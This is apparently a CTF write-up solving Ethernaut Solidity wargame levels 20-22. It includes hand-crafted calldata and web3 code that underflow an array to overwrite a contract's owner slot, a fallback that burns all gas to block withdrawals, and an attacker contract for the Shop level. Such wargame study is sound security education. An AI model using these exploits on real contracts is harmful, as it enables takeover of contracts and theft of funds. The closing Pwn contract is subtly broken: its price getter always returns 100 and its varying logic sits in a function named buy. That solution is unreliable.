Title: Ethernaut wargame Lvl. 20-22
Date: 2018-12-27 10:01
Modified: 2018-12-27 10:01
Category: ctf
Tags: ctf, ethereum, solidity
Slug: Ethernaut_wargame2022
Authors: F3real
Summary: How to solve Ethernaut wargame lvl. 20-22

Ethernaut is great wargame teaching wide variety of Solidity security concepts. 
Currently it offers 22 levels with varied difficulty. It can be found [here](https://ethernaut.zeppelin.solutions/).

[TOC]

## Lvl 20 Alien Codex

~~~solidity
pragma solidity ^0.4.24;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact(bytes32[] _firstContactMessage) public {
    assert(_firstContactMessage.length > 2**200);
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
~~~

Looking at the code we see that first problem we have to overcome is modifier `contacted`. Length of content we need to send has to be greater then 2^200, which is impossible. We can bypass this due to fact that EVM doesn't validate an array's ABI-encoded length vs its actual payload. We will manually encode payload to send in similar way we have done in Blockchain CTF challenges.

~~~text
1d3d4c0b
0000000000000000000000000000000000000000000000000000000000000020
1000000000000000000000000000000000000000000000000000000000000000
~~~

First line is function identifier. It consists of first 32bits of `sha3("make_contact(bytes32[])")`.
Second line shows us offset of array content, in our case it points to second line. Array content starts with length of array, after which actual array elements come (in our case we will just leave it empty).

A lot of values for array length greater then 2^200 cause out of gas exception on CALLDATACOPY instruction. It is probably related to internal way EVM handles it, and is actually really interesting and probably worth looking into more.

~~~javascript
web3.eth.defaultAccount = web3.eth.accounts[0];
var tokenContractAddress = "0x7bd16279c000a2a2bad3080bbf04e111c12c5e9e"
var tx = {
    to : tokenContractAddress,
    data : "0x1d3d4c0b00000000000000000000000000000000000000000000000000000000000000201000000000000000000000000000000000000000000000000000000000000000"
}
web3.eth.sendTransaction(tx, (err,res)=>{console.log(err,res);});
~~~

Anyway after we bypassed modifier second thing is to call `retract` function. This will cause underflow on `codex` array and change its length to 2^200 - 1.
This will enable us to access and modify all of contract storage. As a reminder, storage of contract consists of `2**256` 32 byte slots.

Variables are ordered in the way they are declared. Address owner (inherited from Ownable) is occupying first slot together with `boolean` variable `contacted` due to both of them being smaller then 32 bytes (`addresses` are 20 bytes and `boolean` is one byte). Second slot contains length of `codex` array.

We can access both of them trough public getter or trough `getStorageAt` method of web3:
~~~javascript
web3.eth.getStorageAt(
  tokenContractAddress, 
  slot,
  function (err, result) {
    console.log((web3.toHex(result))); 
  }
);
~~~

Output:

~~~text
0: 0x00000000000000000000000173048cec9010e92c298b016966bde1cc47299df5
1: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
~~~

Formula for locating slot corresponding to array index is:
```keccak256(slot) + index ```

This means we have to calculate index in the way it overflows max value and points to first slot:

```index = 2**256 - keccak256(bytes32(1))```

After we get our index we just have to call `revise` function and overwrite current owner address with ours to win.
Address has to be padded to the left with zeroes.

## Lvl 21 Denial

~~~solidity
pragma solidity ^0.4.24;

contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = 0xA9E;
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance/100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call.value(amountToSend)();
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] += amountToSend;
    }

    // allow deposit of funds
    function() payable {}

    // convenience function
    function contractBalance() view returns (uint) {
        return address(this).balance;
    }
}
~~~

To win this level we have to prevent owner from withdrawing funds. Before funds get transferred to owner there is `partner.call.value(amountToSend)();`, which we can exploit. Since no gas amount has been specified, all gas will be sent to fallback function of partner address.

We can write contract with fallback function that will trigger assert and thus spend all gas, making it so that owner can't withdraw.

~~~solidity
    function() public payable{
        assert(false);
    }
~~~

## Lvl 22 Shop

~~~solidity
pragma solidity 0.4.24;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3000)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3000)();
    }
  }
}
~~~

In this level we need to exploit interface Buyer. Our function `price` has to return different values, in two different calls. 

Only problem is that we can't use storage, since just modifying value costs 5000 gas and we have only 3000 available. Good thing is that `isSold` variable from Shop contract is public and we can access it with the gas we have.

~~~solidity
pragma solidity 0.4.24;

import './Shop.sol';

contract Pwn is Buyer {
  uint public price = 100;
  Shop shop = Shop(0x3a13E6F0EF2498CAbD0b49c7F5B1FA1AeD465125);
  
  function buy() external view returns (uint) {
      return shop.isSold()==true?0:100;  
  }
  
  function pwn() external{
      shop.buy();
  }
}
~~~